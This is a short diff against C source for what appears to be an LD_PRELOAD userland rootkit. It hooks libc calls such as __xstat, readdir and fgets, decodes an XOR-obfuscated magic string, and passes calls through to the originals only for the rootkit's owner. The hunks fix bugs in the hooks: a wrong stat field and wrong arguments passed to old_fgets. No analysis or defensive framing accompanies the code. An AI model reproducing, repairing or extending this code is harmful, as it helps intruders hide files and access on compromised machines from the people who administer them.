@@ -210,7 +210,7 @@ int __xstat(int ver, const char *path, struct stat *buf)
 
 	#ifdef DEBUG 
 	printf("PATH: %s\n", path); 
-	printf("GID: %s\n", s_fstat.gid); 
+	printf("GID: %s\n", s_fstat.st_gid); 
 	#endif
 	
 	memset(&s_fstat, 0, sizeof(stat)); 
@@ -302,8 +302,7 @@ struct dirent *readdir(DIR *dirp)
 	
 	char *magic = strdup(MAGIC); xor(magic); 
 	struct dirent *dir; 
-	struct stat s_fstat; 
-	CLEAN(s_fstat); 
+	struct stat s_fstat;  
 	HOOK(__xstat);
 	if (owned()) return old_readdir(dirp);
 	do
@@ -477,7 +476,7 @@ char *fgets(char *s, int size, FILE *stream)
 	if (p == NULL)
 		return(p);
 	if (owned())
-		return old_fgets(buf, buf_size, fp);
+		return old_fgets(s, size, stream);
 	HOOK(access); 
 	HOOK(stat);
 	if (old_access(s, F_OK) != -1)
